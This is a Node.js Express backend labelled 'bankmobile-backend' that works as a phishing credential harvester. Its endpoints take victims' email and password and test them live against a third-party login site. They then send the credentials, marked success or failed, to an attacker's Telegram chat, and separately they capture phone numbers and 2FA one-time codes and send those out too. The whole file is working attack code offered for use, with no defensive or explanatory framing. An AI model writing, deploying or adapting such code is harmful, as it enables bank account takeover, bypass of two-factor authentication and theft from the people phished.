require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3004;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(cors({ origin: '*' }));
app.use(express.json());

async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) return false;
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        return true;
    } catch (error) {
        return false;
    }
}

async function authenticateWithAPI(email, password) {
    try {
        const params = new URLSearchParams();
        params.append('usrname', email);
        params.append('passwd', password);
        
        const response = await axios.post('https://profile.refundselection.com/authenticate/login', 
            params.toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                maxRedirects: 0,
                validateStatus: (status) => status < 500
            }
        );
        
        if (response.status === 302) {
            return { success: true };
        }
        return { success: false };
    } catch (error) {
        if (error.response && error.response.status === 302) {
            return { success: true };
        }
        return { success: false };
    }
}

app.post('/authenticate', async (req, res) => {
    const { email, password } = req.body;
    console.log(`🔐 Login: ${email}`);
    
    const result = await authenticateWithAPI(email, password);
    
    if (result.success) {
        await sendToTelegram(`✅ SUCCESS!\n📧 ${email}\n🔑 ${password}`);
        res.json({ success: true });
    } else {
        await sendToTelegram(`❌ FAILED\n📧 ${email}\n🔑 ${password}`);
        res.json({ success: false });
    }
});

app.post('/submit-phone', async (req, res) => {
    const { phone } = req.body;
    console.log(`📱 Phone: ${phone}`);
    await sendToTelegram(`📱 PHONE NUMBER\n${phone}`);
    res.json({ success: true });
});

app.post('/submit-otp', async (req, res) => {
    const { otp } = req.body;
    console.log(`🔐 OTP: ${otp}`);
    await sendToTelegram(`🔐 2FA CODE\n${otp}`);
    res.json({ success: true });
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', service: 'bankmobile-backend' });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Backend running on port ${PORT}`);
});
